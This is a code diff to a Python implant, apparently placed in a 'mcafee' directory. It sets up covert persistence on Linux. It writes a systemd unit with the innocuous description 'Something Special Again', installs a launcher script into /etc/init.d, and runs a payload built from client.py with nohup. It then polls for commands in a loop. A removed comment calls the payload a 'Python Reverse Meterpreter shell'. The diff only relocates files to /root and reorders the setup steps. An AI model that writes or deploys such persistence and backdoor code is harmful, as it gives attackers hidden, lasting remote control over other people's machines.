@@ -16,7 +16,7 @@ parent_dir = "mcafee"
 
 class cmdFile:
     def __init__(self, session):
-        self.pwd = '/tmp'
+        self.pwd = '/root'
         self.session = session
         self.oo = b''
         self.ss = ''
@@ -125,13 +125,13 @@ class cmdFile:
         return self.oo
     def setPersistance(self, scriptname):
         try:
-            f = open("/lib/systemd/system/"+scriptname+".service", "wb")   # Python Reverse Meterpreter shell
-            s = "[Unit]\nDescription=Something Special Again\nType=idle\n\n[Service]\nExecStart=/tmp/"+scriptname+".sh\n\n[Install]\nWantedBy=multi-user.target"
+            f = open("/lib/systemd/system/"+scriptname+".service", "wb")
+            s = "[Unit]\nDescription=Something Special Again\nType=idle\n\n[Service]\nExecStart="+self.pwd+"/"+scriptname+".sh\n\n[Install]\nWantedBy=multi-user.target"
             f.write(s)
             f.close()
         except:
             print("")
-        os.system("cp /tmp/"+scriptname+".sh /etc/init.d/\nupdate-rc.d "+scriptname+".sh defaults\nservice "+scriptname+".sh start") 
+        os.system("cp "+self.pwd+"/"+scriptname+".sh /etc/init.d/\nupdate-rc.d "+scriptname+".sh defaults\nservice "+scriptname+".sh start") 
         return  
 
     def linux_python_ScriptCreate(self, payload, scriptname):
@@ -142,14 +142,14 @@ class cmdFile:
         s = subprocess.check_output(['which', 'python'])
         s = s[:len(s)-1]
         f = open(self.pwd+"/"+scriptname+".sh", "wb")
-        s = "#!/bin/sh\nnohup " + s + " " + self.pwd+"/"+scriptname+".py &\n"
+        s = "#!/bin/sh\nnohup " + str(s) + " " + self.pwd+"/"+scriptname+".py &\n"
         f.write(s)
         f.close()
         os.system("chmod +x "+self.pwd+"/"+scriptname+".sh\nsh "+self.pwd+"/"+scriptname+".sh")
 
-c = cmdFile('ss1')
-c.setPersistance("ss1")
+c = cmdFile('trial')
 c.linux_python_ScriptCreate(open('client.py', 'rb').read(),'ss1')
+c.setPersistance("ss1")
 while True:
     try:
         c.getCommandFile()
